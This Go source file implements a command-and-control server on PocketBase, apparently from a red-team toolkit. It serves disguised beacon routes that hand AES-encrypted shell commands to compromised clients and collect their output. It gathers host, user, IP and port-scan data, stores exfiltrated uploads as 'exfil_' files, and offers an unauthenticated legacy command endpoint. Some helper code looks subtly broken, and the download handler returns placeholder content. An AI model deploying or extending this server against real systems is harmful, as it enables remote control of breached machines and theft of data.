package main

import (
    "encoding/json"
	"encoding/csv" 
    "fmt"
    "io"
	"os"    
    "net/http"
    "path/filepath"
    "regexp"
    "strings"
    "time"
    
    "github.com/pocketbase/dbx"
    "github.com/pocketbase/pocketbase"
    "github.com/pocketbase/pocketbase/apis"
    "github.com/pocketbase/pocketbase/core"
)

const (
    MaxCommandSize = 5000
    MaxOutputSize  = 100000
    MaxFileSize    = 104857600
	SessionsDir    = "/home/grisun0/LazyOwn/sessions"
)

var validClientIDRegex = regexp.MustCompile(`^[a-zA-Z0-9_-]{1,100}$`)

func RegisterC2Routes(se *core.ServeEvent, app *pocketbase.PocketBase) {
    // ✅ ENDPOINT DE LOGIN (sin argumentos extra)
    se.Router.POST("/login", func(e *core.RequestEvent) error {
        return HandleLogin(e, app)
    })
    
    // ✅ GET_CONNECTED_CLIENTS
    se.Router.GET("/get_connected_clients", func(e *core.RequestEvent) error {
        return HandleGetConnectedClients(e, app)
    })
    
    // ✅ ISSUE_COMMAND (legacy, para GUI)
    se.Router.POST("/issue_command", func(e *core.RequestEvent) error {
        return HandleIssueCommandLegacy(e, app)
    })
    
    // Rutas del beacon C2
    c2Group := se.Router.Group("/pleasesubscribe/v1/users")
    
    c2Group.GET("/{client_id}", func(e *core.RequestEvent) error {
        return HandleGetCommand(e, app)
    })
    
    c2Group.POST("/{client_id}", func(e *core.RequestEvent) error {
        return HandlePostResult(e, app)
    })
    
    c2Group.POST("/upload", func(e *core.RequestEvent) error {
        return HandleUpload(e, app)
    })
    
    c2Group.GET("/download/{filename}", func(e *core.RequestEvent) error {
        return HandleDownload(e, app)
    })
    
    // Endpoints de administración (protegidos)
    adminGroup := se.Router.Group("/api/c2/admin")
    adminGroup.Bind(apis.RequireSuperuserAuth())
    
    adminGroup.POST("/issue_command", func(e *core.RequestEvent) error {
        return HandleIssueCommand(e, app)
    })
    
    adminGroup.GET("/clients", func(e *core.RequestEvent) error {
        return HandleListClients(e, app)
    })
    
    adminGroup.GET("/results/{client_id}", func(e *core.RequestEvent) error {
        return HandleGetResults(e, app)
    })
}

// ===== HANDLER: Login Compatible con GUI Python =====
func HandleLogin(e *core.RequestEvent, app *pocketbase.PocketBase) error {
    username := e.Request.FormValue("username")
    password := e.Request.FormValue("password")
    
    if username == "" || password == "" {
        return e.BadRequestError("username y password son obligatorios", nil)
    }
    
    app.Logger().Info("Intento de login", "username", username)
    
    // ✅ Buscar admin usando FindRecordsByFilter en la colección _superusers
    superusers, err := app.FindRecordsByFilter(
        "_superusers",
        "email = {:email}",
        "",
        1,
        0,
        dbx.Params{"email": username},
    )
    
    if err != nil || len(superusers) == 0 {
        app.Logger().Warn("Usuario no encontrado", "username", username)
        return e.UnauthorizedError("Credenciales inválidas", nil)
    }
    
    admin := superusers[0]
    
    // ✅ Verificar password (PocketBase almacena hash)
    if !admin.ValidatePassword(password) {
        app.Logger().Warn("Password inválido", "username", username)
        return e.UnauthorizedError("Credenciales inválidas", nil)
    }
    
    app.Logger().Info("Login exitoso", "username", username)
    
    return e.JSON(http.StatusOK, map[string]any{
        "status":  "success",
        "message": "Login exitoso",
    })
}

// ===== HANDLER: Get Connected Clients (Compatible con GUI) =====
func HandleGetConnectedClients(e *core.RequestEvent, app *pocketbase.PocketBase) error {
    cutoff := time.Now().Add(-60 * time.Second)
    
    records, err := app.FindRecordsByFilter(
        "c2_clients",
        "last_seen >= {:cutoff}",
        "-last_seen",
        100,
        0,
        dbx.Params{"cutoff": cutoff},
    )
    
    if err != nil {
        return e.JSON(http.StatusOK, map[string]any{
            "connected_clients": []string{},
        })
    }
    
    clients := make([]string, len(records))
    for i, r := range records {
        clients[i] = r.GetString("client_id")
    }
    
    return e.JSON(http.StatusOK, map[string]any{
        "connected_clients": clients,
    })
}

// ===== HANDLER: Issue Command Legacy (sin autenticación) =====
func HandleIssueCommandLegacy(e *core.RequestEvent, app *pocketbase.PocketBase) error {
    clientID := e.Request.FormValue("client_id")
    command := e.Request.FormValue("command")
    
    if clientID == "" || command == "" {
        return e.BadRequestError("client_id y command son obligatorios", nil)
    }
    
    if !validClientIDRegex.MatchString(clientID) {
        return e.BadRequestError("client_id inválido", nil)
    }
    
    if len(command) > MaxCommandSize {
        return e.BadRequestError(fmt.Sprintf("Comando demasiado largo (max %d bytes)", MaxCommandSize), nil)
    }
    
    collection, _ := app.FindCollectionByNameOrId("c2_commands")
    record := core.NewRecord(collection)
    
    record.Set("client_id", clientID)
    record.Set("command", command)
    record.Set("issued_at", time.Now())
    record.Set("status", "pending")
    
    if err := app.Save(record); err != nil {
        return e.InternalServerError("Error al guardar comando", err)
    }
    
    app.Logger().Info("Comando emitido",
        "client_id", clientID,
        "command", command,
    )
    
    return e.JSON(http.StatusOK, map[string]any{
        "status":  "success",
        "message": "Comando enviado",
    })
}

// ===== RESTO DE HANDLERS (igual que antes) =====

func HandleGetCommand(e *core.RequestEvent, app *pocketbase.PocketBase) error {
    clientID := e.Request.PathValue("client_id")
    
    if !validClientIDRegex.MatchString(clientID) {
        return e.BadRequestError("client_id inválido", nil)
    }
    
    // ✅ REGISTRAR O ACTUALIZAR CLIENTE AUTOMÁTICAMENTE (INCLUSO EN GET)
    clientRecord, err := app.FindFirstRecordByFilter(
        "c2_clients",
        "client_id = {:clientID}",
        dbx.Params{"clientID": clientID},
    )
    
    if err != nil {
        // Cliente nuevo - crear registro
        collection, _ := app.FindCollectionByNameOrId("c2_clients")
        clientRecord = core.NewRecord(collection)
        clientRecord.Set("client_id", clientID)
        clientRecord.Set("hostname", "Unknown")
        clientRecord.Set("ips", "Unknown")
        clientRecord.Set("os", "Unknown")
        clientRecord.Set("user", "Unknown")
        clientRecord.Set("pid", 0)
        clientRecord.Set("status", "active")
        clientRecord.Set("last_seen", time.Now())
        
        if err := app.Save(clientRecord); err != nil {
            app.Logger().Warn("Error creando nuevo cliente", "client_id", clientID, "error", err)
        } else {
            app.Logger().Info("Nuevo cliente registrado en GET",
                "client_id", clientID,
            )
        }
    } else {
        // Actualizar last_seen
        clientRecord.Set("last_seen", time.Now())
        if err := app.Save(clientRecord); err != nil {
            app.Logger().Warn("Error actualizando cliente", "client_id", clientID)
        }
    }
    
    // Buscar comando pendiente
    record, err := app.FindFirstRecordByFilter(
        "c2_commands",
        "client_id = {:clientID} && status = 'pending'",
        dbx.Params{"clientID": clientID},
    )
    
    if err != nil {
        emptyEncrypted, err := AESEncrypt([]byte(""))
        if err != nil {
            return e.InternalServerError("Error de cifrado", err)
        }
        return e.String(http.StatusOK, emptyEncrypted)
    }
    
    command := record.GetString("command")
    
    record.Set("status", "delivered")
    if err := app.Save(record); err != nil {
        return e.InternalServerError("Error al actualizar estado", err)
    }
    
    encryptedCommand, err := AESEncrypt([]byte(command))
    if err != nil {
        return e.InternalServerError("Error de cifrado", err)
    }
    
    return e.String(http.StatusOK, encryptedCommand)
}

func HandleUpload(e *core.RequestEvent, app *pocketbase.PocketBase) error {
    encryptedBody, err := io.ReadAll(e.Request.Body)
    if err != nil {
        return e.BadRequestError("Error al leer archivo", err)
    }
    defer e.Request.Body.Close()
    
    if len(encryptedBody) > MaxFileSize*2 {
        return e.BadRequestError("Archivo demasiado grande", nil)
    }
    
    decryptedFile, err := AESDecrypt(string(encryptedBody))
    if err != nil {
        return e.BadRequestError("Error de desencriptación", err)
    }
    
    filename := fmt.Sprintf("exfil_%d.bin", time.Now().Unix())
    
    collection, _ := app.FindCollectionByNameOrId("c2_files")
    record := core.NewRecord(collection)
    
    record.Set("filename", filename)
    record.Set("file_type", "upload")
    record.Set("uploaded_at", time.Now())
    
    app.Logger().Info("Archivo recibido", 
        "filename", filename, 
        "size", len(decryptedFile),
    )
    
    if err := app.Save(record); err != nil {
        return e.InternalServerError("Error al guardar metadata del archivo", err)
    }
    
    return e.JSON(http.StatusOK, map[string]any{
        "status":   "success",
        "filename": filename,
        "size":     len(decryptedFile),
    })
}

func HandleDownload(e *core.RequestEvent, app *pocketbase.PocketBase) error {
    filename := e.Request.PathValue("filename")
    
    cleanFilename := filepath.Base(filename)
    if cleanFilename != filename || strings.Contains(filename, "..") {
        return e.ForbiddenError("Nombre de archivo inválido", nil)
    }
    
    record, err := app.FindFirstRecordByFilter(
        "c2_files",
        "filename = {:filename} && file_type = 'download'",
        dbx.Params{"filename": cleanFilename},
    )
    
    if err != nil {
        return e.NotFoundError("Archivo no encontrado", err)
    }
    
    app.Logger().Info("Descarga de archivo solicitada",
        "filename", cleanFilename,
        "record_id", record.Id,
    )
    
    fileData := []byte("dummy_file_content_placeholder")
    
    encryptedData, err := AESEncrypt(fileData)
    if err != nil {
        return e.InternalServerError("Error de cifrado", err)
    }
    
    e.Response.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", cleanFilename))
    e.Response.Header().Set("Content-Type", "application/octet-stream")
    return e.String(http.StatusOK, encryptedData)
}

func HandleIssueCommand(e *core.RequestEvent, app *pocketbase.PocketBase) error {
    data := struct {
        ClientID string `json:"client_id" form:"client_id"`
        Command  string `json:"command" form:"command"`
    }{}
    
    if err := e.BindBody(&data); err != nil {
        return e.BadRequestError("Datos inválidos", err)
    }
    
    if data.ClientID == "" || data.Command == "" {
        return e.BadRequestError("client_id y command son obligatorios", nil)
    }
    
    if !validClientIDRegex.MatchString(data.ClientID) {
        return e.BadRequestError("client_id inválido", nil)
    }
    
    if len(data.Command) > MaxCommandSize {
        return e.BadRequestError(fmt.Sprintf("Comando demasiado largo (max %d bytes)", MaxCommandSize), nil)
    }
    
    collection, _ := app.FindCollectionByNameOrId("c2_commands")
    record := core.NewRecord(collection)
    
    record.Set("client_id", data.ClientID)
    record.Set("command", data.Command)
    record.Set("issued_at", time.Now())
    record.Set("status", "pending")
    
    if err := app.Save(record); err != nil {
        return e.InternalServerError("Error al guardar comando", err)
    }
    
    return e.JSON(http.StatusOK, map[string]any{
        "status":     "success",
        "command_id": record.Id,
    })
}

func HandlePostResult(e *core.RequestEvent, app *pocketbase.PocketBase) error {
    clientID := e.Request.PathValue("client_id")
    
    if !validClientIDRegex.MatchString(clientID) {
        return e.BadRequestError("client_id inválido", nil)
    }
    
    encryptedBody, err := io.ReadAll(e.Request.Body)
    if err != nil {
        return e.BadRequestError("Error al leer body", err)
    }
    defer e.Request.Body.Close()
    
    if len(encryptedBody) > MaxOutputSize*2 {
        return e.BadRequestError("Body demasiado grande", nil)
    }
    
    decryptedData, err := AESDecrypt(string(encryptedBody))
    if err != nil {
        return e.BadRequestError("Error de desencriptación", err)
    }
    
    var data struct {
        Output         string `json:"output"`
        Command        string `json:"command"`
        Client         string `json:"client"`
        PID            int    `json:"pid"`
        Hostname       string `json:"hostname"`
        IPs            string `json:"ips"`
        User           string `json:"user"`
        DiscoveredIPs  string `json:"discovered_ips"`
        ResultPortScan string `json:"result_portscan"`
        ResultPWD      string `json:"result_pwd"`
    }
    
    if err := json.Unmarshal(decryptedData, &data); err != nil {
        return e.BadRequestError("JSON inválido", err)
    }
    
    if data.Command == "" {
        return e.BadRequestError("Campo 'command' obligatorio", nil)
    }
    
    // Registrar o actualizar cliente
    clientRecord, err := app.FindFirstRecordByFilter(
        "c2_clients",
        "client_id = {:clientID}",
        dbx.Params{"clientID": clientID},
    )
    
    if err != nil {
        collection, _ := app.FindCollectionByNameOrId("c2_clients")
        clientRecord = core.NewRecord(collection)
        clientRecord.Set("client_id", clientID)
    }
    
    clientRecord.Set("hostname", truncate(data.Hostname, 255))
    clientRecord.Set("ips", truncate(data.IPs, 500))
    clientRecord.Set("os", truncate(data.Client, 50))
    clientRecord.Set("user", truncate(data.User, 100))
    clientRecord.Set("pid", data.PID)
    clientRecord.Set("last_seen", time.Now())
    clientRecord.Set("status", "active")
    
    if err := app.Save(clientRecord); err != nil {
        return e.InternalServerError("Error al guardar cliente", err)
    }
    
    // Guardar resultado en BD
    resultsCollection, _ := app.FindCollectionByNameOrId("c2_results")
    resultRecord := core.NewRecord(resultsCollection)
    
    resultRecord.Set("client_id", clientID)
    resultRecord.Set("command", truncate(data.Command, 5000))
    resultRecord.Set("output", truncate(data.Output, MaxOutputSize))
    resultRecord.Set("hostname", truncate(data.Hostname, 255))
    resultRecord.Set("pwd", truncate(data.ResultPWD, 1000))
    resultRecord.Set("received_at", time.Now())
    
    if err := app.Save(resultRecord); err != nil {
        return e.InternalServerError("Error al guardar resultado", err)
    }
    
    // ✅ ESCRIBIR LOG CSV DIRECTAMENTE
    if err := os.MkdirAll(SessionsDir, 0755); err == nil {
        sanitizedID := strings.Map(func(r rune) rune {
            if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || 
               (r >= '0' && r <= '9') || r == '_' || r == '-' {
                return r
            }
            return -1
        }, clientID)
        
        logFile := filepath.Join(SessionsDir, sanitizedID+".log")
        file, err := os.OpenFile(logFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
        
        if err == nil {
            defer file.Close()
            
            writer := csv.NewWriter(file)
            defer writer.Flush()
            
            // Escribir header si es nuevo
            fileInfo, _ := os.Stat(logFile)
            if fileInfo.Size() == 0 {
                header := []string{
                    "client_id", "os", "pid", "hostname", "ips", "user",
                    "discovered_ips", "result_portscan", "result_pwd", "command", "output",
                }
                writer.Write(header)
            }
            
            // Escribir fila
            row := []string{
                sanitizedID,
                truncate(data.Client, 100),
                fmt.Sprintf("%d", data.PID),
                truncate(data.Hostname, 100),
                truncate(data.IPs, 100),
                truncate(data.User, 50),
                truncate(data.DiscoveredIPs, 1000),
                truncate(data.ResultPortScan, 1000),
                truncate(data.ResultPWD, 1000),
                truncate(data.Command, 500),
                truncate(data.Output, 1000),
            }
            writer.Write(row)
        }
    }
    
    app.Logger().Info("Resultado recibido",
        "client_id", clientID,
        "command", data.Command,
    )
    
    return e.JSON(http.StatusOK, map[string]any{
        "status":   "success",
        "platform": data.Client,
    })
}


// ✅ FUNCIÓN NUEVA: Escribir logs en CSV
func writeLogCSV(clientID string, data struct {
    Output         string
    Command        string
    Client         string
    PID            int
    Hostname       string
    IPs            string
    User           string
    DiscoveredIPs  string
    ResultPortScan string
    ResultPWD      string
}) error {
    // Crear directorio si no existe
    if err := os.MkdirAll(SessionsDir, 0755); err != nil {
        return err
    }
    
    // Sanitizar nombre del cliente
    sanitizedID := strings.Map(func(r rune) rune {
        if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || 
           (r >= '0' && r <= '9') || r == '_' || r == '-' {
            return r
        }
        return -1
    }, clientID)
    
    logFile := filepath.Join(SessionsDir, sanitizedID+".log")
    
    // Abrir archivo en modo append
    file, err := os.OpenFile(logFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
    if err != nil {
        return err
    }
    defer file.Close()
    
    writer := csv.NewWriter(file)
    defer writer.Flush()
    
    // Escribir header si es nuevo
    fileInfo, _ := os.Stat(logFile)
    if fileInfo.Size() == 0 {
        header := []string{
            "client_id", "os", "pid", "hostname", "ips", "user",
            "discovered_ips", "result_portscan", "result_pwd", "command", "output",
        }
        if err := writer.Write(header); err != nil {
            return err
        }
    }
    
    // Truncar strings para seguridad (como en Flask)
    row := []string{
        sanitizedID,
        truncate(data.Client, 100),
        fmt.Sprintf("%d", data.PID)[:20],
        truncate(data.Hostname, 100),
        truncate(data.IPs, 100),
        truncate(data.User, 50),
        truncate(data.DiscoveredIPs, 1000),
        truncate(data.ResultPortScan, 1000),
        truncate(data.ResultPWD, 1000),
        truncate(data.Command, 500),
        truncate(data.Output, 1000),
    }
    
    return writer.Write(row)
}


func HandleListClients(e *core.RequestEvent, app *pocketbase.PocketBase) error {
    records, err := app.FindRecordsByFilter(
        "c2_clients",
        "",
        "-last_seen",
        100,
        0,
    )
    
    if err != nil {
        return e.InternalServerError("Error al consultar clientes", err)
    }
    
    clients := make([]map[string]any, len(records))
    for i, r := range records {
        clients[i] = map[string]any{
            "id":        r.Id,
            "client_id": r.GetString("client_id"),
            "hostname":  r.GetString("hostname"),
            "ips":       r.GetString("ips"),
            "os":        r.GetString("os"),
            "user":      r.GetString("user"),
            "pid":       r.GetInt("pid"),
            "last_seen": r.GetDateTime("last_seen"),
            "status":    r.GetString("status"),
        }
    }
    
    return e.JSON(http.StatusOK, clients)
}

func HandleGetResults(e *core.RequestEvent, app *pocketbase.PocketBase) error {
    clientID := e.Request.PathValue("client_id")
    
    if !validClientIDRegex.MatchString(clientID) {
        return e.BadRequestError("client_id inválido", nil)
    }
    
    records, err := app.FindRecordsByFilter(
        "c2_results",
        "client_id = {:clientID}",
        "-received_at",
        100,
        0,
        dbx.Params{"clientID": clientID},
    )
    
    if err != nil {
        return e.InternalServerError("Error al consultar resultados", err)
    }
    
    results := make([]map[string]any, len(records))
    for i, r := range records {
        results[i] = map[string]any{
            "id":          r.Id,
            "command":     r.GetString("command"),
            "output":      r.GetString("output"),
            "hostname":    r.GetString("hostname"),
            "pwd":         r.GetString("pwd"),
            "received_at": r.GetDateTime("received_at"),
        }
    }
    
    return e.JSON(http.StatusOK, results)
}

func truncate(s string, maxLen int) string {
    if len(s) <= maxLen {
        return s
    }
    return s[:maxLen]
}
